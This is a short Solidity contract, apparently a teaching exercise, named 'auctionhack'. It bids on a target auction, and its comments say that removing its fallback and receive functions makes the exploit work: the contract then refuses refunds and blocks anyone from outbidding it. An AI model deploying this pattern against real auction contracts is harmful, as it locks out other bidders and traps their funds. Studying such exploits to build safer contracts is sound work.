// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface auction {
    function bid() external payable;
}

contract auctionhack {
    auction public auctioncontract;

    constructor(address _address) {
        auctioncontract = auction(_address);
    }

    function bid() public payable {
        auctioncontract.bid{value: msg.value}();
    }

    // Possible way to receive tokens from a smart contract and in a smart contract 
    // A fallback() can also be used to in case by calling a function which isn't available  
    fallback() external payable {
        // Remove this function for the exploit to work
    }

    // Possible way to receive tokens from a smart contract and in a smart contract 
    receive() external payable {
        // Remove this function for the exploit to work
    }
}